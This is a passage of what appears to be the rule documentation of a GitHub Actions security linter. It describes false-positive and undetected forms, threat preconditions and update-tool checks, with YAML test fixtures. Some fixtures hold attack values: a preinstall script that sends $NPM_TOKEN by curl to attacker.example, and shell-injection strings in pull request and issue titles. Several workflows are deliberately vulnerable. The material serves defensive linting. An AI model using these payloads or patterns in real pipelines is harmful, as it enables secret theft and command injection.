    #   documents do not say whether a job of such a run starts before the run
    #   fails, and the rule assumes that no job starts.
    # cause: the rule does not take the actor rules of the Actions policies into
    #   account: repo.pull-request-target-allowed is one value for all the runs of
    #   the workflow file on pull_request_target, and an actor rule blocks a run
    #   by the account that starts the run.
    # attack-value: github.event.pull_request.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: the account of the attacker is not an allowed actor,
    #   so the run on pull_request_target fails with an error, and no job of the
    #   run starts (the assumption of the reason), so no step has KEY.
    name: policy
    on: pull_request_target
    permissions: {}
    jobs:
      a:
        runs-on: ubuntu-latest
        steps:
          - run: echo "${{ github.event.pull_request.title }}" && ./deploy
            env:
              KEY: ${{ secrets.DEPLOY_KEY }}
    ```
- app-checks-unasked: a run of status, check_suite or check_run in a repository where no app outside GitHub Actions makes a commit status or a check run for a commit that the attacker of the finding writes: the facts that the finding kind asks are false (repo.fork-pr-app-checks for a commit of a pull request from a fork, repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository). In two cases, the rule does not ask these facts, and reports the finding whatever the values of the facts are. First, a workflow whose on has an event other than status, check_suite and check_run: the rule decides whether to ask the facts from the events of on alone, and does not read the if of the job, so the rule does not ask the facts even when the if of the job lets the job run only on status, check_suite or check_run. Second, a reusable workflow (on workflow_call) or an action (an action has no on) that only workflows on status, check_suite or check_run call: the rule asks the facts only of a workflow whose on has only events among these three, not of the reusable workflow or the action, so the rule reports a finding in the reusable workflow or the action whatever the values of the facts are
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: same-file, repo-file)
  - example: app-checks-unasked.yml (workflow, false-positive)
    ```yaml
    # situation: on status and push, the job runs only on status (its if), and
    #   reads the commit of the status in the way the true positive of the kind
    #   does.
    # reason: no app outside GitHub Actions makes a commit status or a check run
    #   for a commit of a pull request from a fork in the repository
    #   (repo.fork-pr-app-checks false), so no run of status has the code of a
    #   pull request from a fork, and the job does not run on push.
    # cause: the rule asks repo.fork-pr-app-checks only of a workflow whose on
    #   has no event other than status, check_suite and check_run, and the on of
    #   this workflow has push.
    # attack-value: the file package.json at the head of the pull request from a fork = "{\"scripts\":{\"preinstall\":\"echo $NPM_TOKEN | curl -d @- https://attacker.example\"}}"
    # attack-run-behavior: no app makes a status for the commit of the pull
    #   request from a fork, so no run of status starts with that commit, and a
    #   push by one who can write runs no job.
    on: [status, push]
    jobs:
      j:
        if: github.event_name == 'status'
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
            with:
              ref: ${{ github.event.sha }}
          - run: npm ci
            env:
              NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
    ```
- actions-not-allowed: a workflow whose run GitHub does not start, or a job that GitHub fails in the step "Set up job", because of the setting of allowed actions of GitHub (the fact repo.allowed-actions, which the quality rule allowed-actions reads): GitHub does not start a run of a workflow that has a uses, or that calls a reusable workflow that has a uses, that the setting does not allow, and fails a job before any step of the job runs when a step of a composite action that the job runs has a uses that the setting does not allow, or when the setting requires a full commit SHA and a step names an action by a tag or a branch. The harm that the finding reports happens only when GitHub runs the workflow or the job, and the rule does not read repo.allowed-actions
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - example: actions-not-allowed.yml (workflow, false-positive)
    ```yaml
    # situation: the workflow of the true positive token-write (token-write.yml)
    #   of the rule, with a job added whose step uses
    #   example-org/not-allowed-action, which the setting of allowed actions of
    #   GitHub (repo.allowed-actions) blocks with
    #   !example-org/not-allowed-action@*. In the true positive, on issues, a
    #   job whose token may write contents echoes the issue's title, written in
    #   by ${{ }}.
    # reason: GitHub checks each uses of the workflow before the run starts, and
    #   does not start the run because of the uses of
    #   example-org/not-allowed-action: no job of the run runs, so what the
    #   reason of the true positive says does not happen (in runs that the
    #   authors of the rule made on GitHub, such runs ended as startup_failure).
    # cause: the rule does not read repo.allowed-actions.
    # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
    # attack-run-behavior: GitHub does not start the run, so no step of the run
    #   runs, and the attack does nothing.
    on: issues
    jobs:
      a:
        runs-on: ubuntu-latest
        permissions:
          contents: write
        steps:
          - run: echo "${{ github.event.issue.title }}"
      not-allowed:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/not-allowed-action@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
    ```
- absent-approval-label: a job that runs only when a label is added (pull_request_target with the activity type labeled), whose if compares the label with a name that no label of the repository has, in a run of the linter that adds the attacker triage-account: the rule reads every label that the if compares with as a label of the repository, and reads the attacker as able to add the label; when the repository has no such label, the attacker cannot add the label, because the triage role cannot create a label, and the job does not run on the pull request of the attacker. The linter does not read the labels of the repository
  - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
  - disposition: todo (needs: fact)
  - added attackers: triage-account
  - example: absent-approval-label.yml (workflow, false-positive)
    ```yaml
    # situation: on pull_request_target with the activity type labeled, a job
    #   that runs only when the label safe-to-test is added checks out the head
    #   of the pull request, runs npm ci, and has a token that writes and a
    #   cache that the job may save to.
    # reason: in a run of the linter that adds triage-account, the rule reads
    #   the label safe-to-test as a label that the attacker can add; when the
    #   repository has no label safe-to-test, the attacker cannot add the
    #   label, because the triage role cannot create a label, and the job does
    #   not run on the attacker's pull request.
    # cause: the rule does not read the labels of the repository: it reads
    #   every label that the if of the job compares with as a label that the
    #   repository has.
    # attack-value: the file package.json in the head of the pull request = "{\"scripts\": {\"preinstall\": \"echo PWNED\"}}"
    # attack-run-behavior: the repository has no label safe-to-test, so the
    #   attacker cannot add the label safe-to-test, no run of the job starts,
    #   and npm never runs the preinstall script.
    on:
      pull_request_target:
        types: [labeled]
    jobs:
      build:
        if: github.event.label.name == 'safe-to-test'
        runs-on: ubuntu-latest
        cache-mode: write
        permissions:
          contents: write
        steps:
          - uses: actions/checkout@v4.2.2
            with:
              ref: ${{ github.event.pull_request.head.sha }}
          - run: npm ci
    ```

### threat

- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
  - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
  - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
  - cites:
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#status>
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#check_suite>
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#check_run>
- precondition privileged-job: the job runs on an event that one without write access triggers and whose run has the repository's secrets and a token that may write: pull_request_target, workflow_run, issue_comment, issues, discussion, discussion_comment, fork, each run on the default branch; status, check_suite and check_run, each run on the default branch where an app outside GitHub Actions makes a commit status or a check run for a commit whose message an attacker writes (the precondition app-status-check); pull_request_review and pull_request_review_comment of a pull request from a branch of the repository, each run on the merge ref of the pull request (anyone with read access can open a pull request between two branches that the repository already has; a run of a review of a pull request that one without write access opened between two branches that others pushed to the repository is inferred to have the same secrets and token: the runs that the authors of the linter saw were of reviews of pull requests that the owner opened); not pull_request, whose author can change its workflow; not a review of a pull request from a fork, whose run takes the workflow of the merge commit of the pull request, which the author of the pull request can change (a review of another's pull request from a fork is the undetected form fork-review); not workflow_dispatch, which one with write access to the permission Actions dispatches and for which the one who dispatches the workflow chooses only a branch or a tag of the repository and the inputs, so that the run takes the repository's code
  - observed: 2026-09-28, runner 2.337.0: a pull request from a fork ran pull_request_target, workflow_run after its pull_request, and issue_comment on a comment, each with the repository's secret and a token that created a ref
  - observed: 2026-10-30, runner 2.338.0: a review and a comment on the diff, by an account with no role in a public repository, of a pull request from a branch of the repository that the owner opened: each run started with no approval, with the repository's secret and a token that created a ref
  - observed: 2026-11-01, runner 2.338.2: a review and a comment on the diff of a pull request from a fork whose branch changed a workflow on pull_request_review and pull_request_review_comment: each run ran the workflow as the pull request changed it, from the merge ref of the pull request
  - cites:
    - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
    - <https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets>
- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected false: an environment is made with no protection rules)
  - observed: 2026-09-28, runner 2.337.0: a push after the label ran no labeled run, and ran pull_request_target on synchronize
- precondition token-writes: the job's token may write: a scope other than id-token written write, or no permissions written and the repository's default writes (repo.default-token-write true)
  - cites:
    - <https://docs.github.com/en/actions/concepts/security/github_token>
- precondition reads-secrets: the job reads secrets other than GITHUB_TOKEN: in the env of the workflow, the job or a step, the outputs of the job, a step's run, with, name, working-directory, timeout-minutes or continue-on-error, the env or the credentials of the job's container or of a service, or, for a job that calls a reusable workflow, the secrets that GitHub passes to the runners of the jobs of the called workflow: with secrets: inherit, the secrets that those jobs read by name, and every secret when one of those jobs reads the secrets context without naming a secret (toJSON(secrets), secrets&#91;&lt;an expression>], secrets.\* (an object filter)); with secrets passed one by one under the secrets: of the calling job, the passed secrets that those jobs read by the names that the calling job gives the secrets. The rule reads a called workflow whose contents the linter has: a workflow that is among the inputs and that the job calls by ./ or \$/, or a reusable workflow of another repository that the fact workflow.definition answers. The runs that showed what GitHub passes called a reusable workflow of the same repository and of another repository of the same organization; the rule assumes the same for a repository of another organization of the same enterprise. When the linter is not given the name of the repository (--repo), a call of the repository's own workflow by owner/repo/path@ref is read as a call of another repository; with the name, the rule does not read the input file for such a call, as the ref of the call may name another version of the file. For a called workflow whose contents the linter does not have, the rule assumes that the jobs of the called workflow read every secret that the job passes (with secrets: inherit, every secret of the job)
  - observed: 2026-10-23, runner 2.337.0: a secret that the job reads in the username or in the password of the credentials of the job's container, and nowhere else, was in the memory of the process Runner.Worker of the runner on the host, and a step in the job's container read that memory through the docker socket that the runner mounts in the job's container on Linux
  - observed: 2026-11-06, runner 2.337.0: the reusable workflows were called by ./ and by owner/repo/path@sha from the same repository, from another repository of the same organization, and two calls deep. A job of a called workflow got in its runner only the secrets that the job read by name, with secrets: inherit and with secrets passed one by one. The job got every secret that the caller passed when the job read toJSON(secrets), and a secret passed one by one that the job did not read was not in the runner of the job
  - cites:
    - <https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets>
    - <https://docs.github.com/en/actions/reference/workflows-and-actions/reusing-workflow-configurations>
    - <https://github.com/actions/runner/blob/397b032cbf865e9c3ddfab89d533ec19325e1273/src/Runner.Worker/Container/ContainerInfo.cs>
- precondition flaw-in-job: a flaw runs the attacker's code in the job: an injection, a checkout of their code, an artifact or a cache of theirs; the rule does not look for it, the other rules report those they see
  - cites:
    - <https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>
- actor: fork-pr-author
  - via: opens or updates a pull request from a fork, which runs pull_request_target, and workflow_run after its pull_request; or pushes a commit to the pull request, and an app outside GitHub Actions makes a commit status or a check run for the commit, and the commit status or the check run starts a run of status, check_suite or check_run whose actor is the app
  - events: pull_request_target, workflow_run, status, check_suite, check_run
  - run starters: pull_request_target: attacker, workflow_run: attacker, status: attacker, check_suite: attacker, check_run: attacker
  - gains: read-secrets, write-with-token
- actor: issue-author
  - via: opens an issue or a discussion
  - events: issues, discussion
  - run starters: issues: attacker, discussion: attacker
  - gains: read-secrets, write-with-token
- actor: commenter
  - via: comments on an issue, a pull request or a discussion, or reviews a pull request from a branch of the repository or comments on the diff of the pull request
  - events: issue_comment, discussion_comment, pull_request_review, pull_request_review_comment
  - run starters: issue_comment: attacker, discussion_comment: attacker, pull_request_review: attacker, pull_request_review_comment: attacker
  - gains: read-secrets, write-with-token
- actor: anyone-who-forks
  - via: forks the repository
  - events: fork
  - run starters: fork: attacker
  - gains: read-secrets, write-with-token
- incident spotbugs-2024: 2024-12-06: a pull_request_target job with write scopes held a maintainer's personal access token as a secret; a pull request ran its code there by a checkout of its mvnw, and the token was the start of the tj-actions compromise
  - advisory: <https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack/>
  - compromised: spotbugs/sonar-findbugs
  - downstream: tj-actions/changed-files

## dependabot-github-actions

- problem: no update tool keeps the uses of a workflow or an action metadata file current: no entry of Dependabot version updates reads the file, and Renovate does not update the uses (the rule keeps the name of the rule of sisakulint, and reads the configuration of Renovate too)
- expected: every file whose uses name an action of another repository or a reusable workflow of another repository by a commit SHA or a version is a file that an entry of .github/dependabot.yml with package-ecosystem github-actions makes Dependabot read, or a file whose every such uses Renovate updates
- targets: workflow, action-metadata
- quality rule: a finding of the quality rule alone gives no attacker a gain, and the findings of the quality rule set no bit of the exit code
- default run: always: in a run without --rule, the rule runs unless --skip-rule names the rule

### finding kinds

- dependabot-github-actions.no-update-tool
  - detected: no update tool updates {uses} and every other such uses of the same file, if there are any: no entry of .github/dependabot.yml with package-ecosystem github-actions lists {directory}, the directory that an entry would have to list for Dependabot to read the file, with version updates enabled (an entry whose open-pull-requests-limit is 0 does not count), and no Renovate configuration in the repository updates the file
  - arguments:
    - {uses}: The first uses of the file that no update tool updates, as written.
    - {directory}: The directory that an entry of .github/dependabot.yml would have to list for Dependabot to read the file: / for a workflow right under .github/workflows and for the action.yml or action.yaml at the root of the repository (Dependabot reads those files for the directory /); else the directory of the file from the root, starting with /, such as /.github/actions/build.
  - consequence: when a new version of an action or a reusable workflow is released, no pull request updates the uses; a uses pinned to a commit SHA never gets a Dependabot alert or a security update, whatever the configuration, so version updates are the only updates of such a uses, and without them the workflow keeps running the old commit until a person changes the uses
  - remedy: create .github/dependabot.yml with version: 2 if the repository has none, and add to the updates of .github/dependabot.yml an entry with package-ecosystem: github-actions whose key directory: or key directories: lists the directory named in the finding; or configure Renovate to update the file
  - fact kinds: dependabot.version-updates, renovate.manager-enabled
  - true positives:
    - no-update-tool.yml (workflow, true-positive)
      ```yaml
      # situation: a workflow pins actions/checkout to a commit SHA and uses
      #   actions/setup-node by a tag, and the repository has no
      #   .github/dependabot.yml and no configuration file of Renovate.
      # reason: no update tool opens a pull request when a new version of either
      #   action is released; the action pinned to a SHA gets no Dependabot alert
      #   either, so the workflow keeps running the old commit.
      on: push
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
            - uses: actions/setup-node@v4
      ```
  - true negatives:
    - no-update-tool.dependabot.yml (workflow, true-negative)
      ```yaml
      # situation: the form of on-keyday/brgen (pull request 359,
      #   https://github.com/on-keyday/brgen/pull/359, whose base commit
      #   ef4654f7de65e8b44326906e27fc658be996b246 has a .github/dependabot.yml
      #   with package-ecosystem github-actions and directory /): a workflow pins
      #   actions/setup-node to a commit SHA with no comment on the line.
      # reason: Dependabot version updates read the workflows under
      #   .github/workflows for that entry, and Dependabot opened the pull request
      #   that moved this SHA to the commit of v6.4.0, though the line had no
      #   comment.
      on: push
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - name: Set up Node.js
              uses: actions/setup-node@53b83947a5a98c8d113130e565377fae1a50d02f
              with:
                node-version: "23.11"
      ```
- dependabot-github-actions.unversioned-sha
  - detected: Renovate updates the file, but does not update {uses} and every other uses of the same file that is pinned to a commit SHA without a version comment, if there are any; and no entry of .github/dependabot.yml with package-ecosystem github-actions lists {directory}, the directory that an entry would have to list for Dependabot to read the file, with version updates enabled (an entry whose open-pull-requests-limit is 0 does not count)
  - arguments:
    - {uses}: The first uses of the file that is pinned to a commit SHA without a version comment, as written.
    - {directory}: The directory that an entry of .github/dependabot.yml would have to list for Dependabot to read the file: / for a workflow right under .github/workflows and for the action.yml or action.yaml at the root of the repository (Dependabot reads those files for the directory /); else the directory of the file from the root, starting with /, such as /.github/actions/build.
  - consequence: Renovate skips a uses pinned to a commit SHA when the line of the uses has no comment that names a version; a uses pinned to a commit SHA never gets a Dependabot alert or a security update, whatever the configuration, so when a new version is released, no pull request updates the uses, and the workflow keeps running the old commit until a person changes the uses
  - remedy: write the version of the commit as a comment at the end of the line of each such uses, such as # v4.1.0, so that Renovate updates the uses; or create .github/dependabot.yml with version: 2 if the repository has none, and add to the updates of .github/dependabot.yml an entry with package-ecosystem: github-actions whose key directory: or key directories: lists the directory named in the finding
  - fact kinds: dependabot.version-updates, renovate.manager-enabled
  - true positives:
    - unversioned-sha.yml (workflow, true-positive)
      ```yaml
      # situation: the repository has a configuration file of Renovate and no
      #   .github/dependabot.yml, and a workflow pins actions/checkout to a commit
      #   SHA with no comment on the line.
      # reason: Renovate does not update a uses pinned to a SHA without a comment
      #   that names the version (unversioned-reference), and Dependabot does not
      #   read the file, so no pull request moves the SHA.
      on: push
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
            - uses: actions/setup-node@v4
      ```
  - true negatives:
    - unversioned-sha.yml (workflow, true-negative)
      ```yaml
      # situation: the repository has a configuration file of Renovate and no
      #   .github/dependabot.yml, and a workflow pins actions/checkout to a commit
      #   SHA with the version as a comment on the line.
      # reason: Renovate reads the comment as the version of the SHA and updates
      #   the SHA with the comment when a new version is released.
      on: push
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      ```

### undetected forms

- other-ref: a uses whose ref is a tag that is neither a commit SHA nor a version (v and digits such as v4, digits with dots such as 1.2, or a date such as 20240101), such as stable: the rule does not report the uses, also in a repository with no update tool, since whether Dependabot or Renovate updates such a tag is not known
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: fact)
  - example: other-ref.yml (workflow, undetected)
    ```yaml
    # situation: the repository has no update tool, and a workflow uses an
    #   action by a tag named stable.
    # reason: the uses stays on whatever commit stable points to; whether
    #   Dependabot would move a tag that is not a version is not known.
    # cause: the rule counts a uses only when its ref is a commit SHA or a
    #   version, the refs that Dependabot is known to update.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/build-action@stable
    ```
- fork: a file of a fork: Dependabot version updates do not run on a fork that has .github/dependabot.yml until Dependabot version updates are enabled under Code security and analysis in the settings of the fork, and the rule does not read the settings
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: fact)
  - example: fork.yml (workflow, undetected)
    ```yaml
    # situation: the repository is a fork, whose .github/dependabot.yml (from
    #   the original repository) has an entry of package-ecosystem
    #   github-actions, and the fork has not turned version updates on.
    # reason: Dependabot version updates do not run on the fork, so no pull
    #   request updates the uses.
    # cause: whether the repository is a fork, and its setting, are not in the
    #   files the rule reads.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v4
    ```
- not-running: a repository where the update tool does not run: Dependabot paused for a repository without activity, Dependabot turned off by an administrator or a policy of GitHub Enterprise Server, or a configuration file of Renovate in a repository where Renovate is not installed: the rule does not read whether the update tool runs
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: fact)
  - example: not-running.yml (workflow, undetected)
    ```yaml
    # situation: the repository has a configuration file of Renovate, and
    #   Renovate is not installed on the repository.
    # reason: nothing runs Renovate, so no pull request updates the uses.
    # cause: whether Renovate is installed, or Dependabot is paused or turned
    #   off, is not in the files the rule reads.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v4
    ```
- renovate-line-form: a uses that Renovate does not read in the form the uses is written in, such as a uses in a flow mapping or in a scalar of several lines: Renovate reads the line of uses:, and the rule reads the uses as updated
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: same-file)
  - example: renovate-line-form.yml (workflow, undetected)
    ```yaml
    # situation: the repository has a configuration file of Renovate and no
    #   .github/dependabot.yml, and a step writes its uses in a flow mapping.
    # reason: Renovate reads the uses of a line of uses:, so Renovate does not
    #   update the uses in the flow mapping.
    # cause: the rule takes Renovate to update every uses of a file that
    #   Renovate handles.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - {uses: actions/setup-node@v4, with: {node-version: "24"}}
    ```
- folded-uses: a uses written as \${{ }} around a string literal, such as \${{ 'actions/setup-node@v4' }} (not a folded scalar of YAML): the rule does not know whether the update tools read such a uses, and does not report the uses, also in a repository with no update tool
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: same-file)
  - example: folded-uses.yml (workflow, undetected)
    ```yaml
    # situation: the repository has no update tool, and a step writes its uses
    #   as a ${{ }} literal.
    # reason: no update tool updates the uses, and an update tool would not
    #   read the folded form either.
    # cause: the rule does not count a folded uses, since an entry of
    #   .github/dependabot.yml would not update the uses.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: ${{ 'actions/setup-node@v4' }}
    ```
- hex-ref: a uses pinned to 8 to 39 hexadecimal digits, such as abcdef12, in a file that Renovate updates: Dependabot reads the ref as a commit SHA, Renovate does not (Renovate reads 40 or 64 digits, or 6 or 7), and whether Renovate updates such a ref is not known: the rule reads the uses as updated by Renovate
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: fact)
  - example: hex-ref.yml (workflow, undetected)
    ```yaml
    # situation: the repository has a configuration file of Renovate and no
    #   .github/dependabot.yml, and a workflow pins an action to eight
    #   hexadecimal digits with no comment on the line.
    # reason: Renovate does not read eight digits as a commit SHA, so whether
    #   Renovate updates the uses is not known; the uses may stay on the old
    #   commit.
    # cause: the rule reads a ref that is not a SHA of Renovate as one that
    #   Renovate updates.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: example-org/build-action@abcdef12
    ```
- ignored-dependency: a uses of an action that the key ignore: of .github/dependabot.yml or a package rule of Renovate names: the update tool does not update the action, and the rule reads the file as updated
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: repo-file)
  - example: ignored-dependency.yml (workflow, undetected)
    ```yaml
    # situation: .github/dependabot.yml has an entry of package-ecosystem
    #   github-actions for directory / whose ignore names actions/setup-node.
    # reason: Dependabot does not update the uses of actions/setup-node.
    # cause: the rule asks whether an entry reads the file, not whether the
    #   entry ignores an action of the file.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v4
    ```
- default-branch: a run on a branch that is not the default branch, whose .github/dependabot.yml is not on the default branch yet: Dependabot reads .github/dependabot.yml of the default branch, and the rule reads .github/dependabot.yml under --root
  - finding kinds: dependabot-github-actions.no-update-tool, dependabot-github-actions.unversioned-sha
  - disposition: todo (needs: fact)
  - example: default-branch.yml (workflow, undetected)
    ```yaml
    # situation: a pull request adds .github/dependabot.yml with an entry of
    #   package-ecosystem github-actions, and the linter runs on the branch of
    #   the pull request.
    # reason: until the pull request is merged, the default branch has no
    #   .github/dependabot.yml, so Dependabot updates nothing.
    # cause: the rule reads .github/dependabot.yml under --root, the files of
    #   the branch, not those of the default branch.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v4
    ```

### false positive forms

- outside-config: a repository that Renovate updates by a configuration from outside the repository (a global configuration, an inherited configuration), with no configuration file in the repository: the rule reads the files of the repository only; for such a repository, pass --fact renovate.manager-enabled&#91;manager=github-actions,input_path=&lt;path>]=true once for each workflow and action metadata file that Renovate updates
  - finding kinds: dependabot-github-actions.no-update-tool
  - disposition: todo (needs: fact)
  - example: outside-config.yml (workflow, false-positive)
    ```yaml
    # situation: the repository has no .github/dependabot.yml and no
    #   configuration file of Renovate, and a self-hosted Renovate updates the
    #   repository by its global configuration (requireConfig optional).
    # reason: Renovate opens a pull request when a new version of the action is
    #   released, so the uses is kept current.
    # cause: a global configuration or an inherited configuration of Renovate is
    #   not in the repository, and the rule reads the files of the repository
    #   only.
    on: push
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/setup-node@v4
    ```
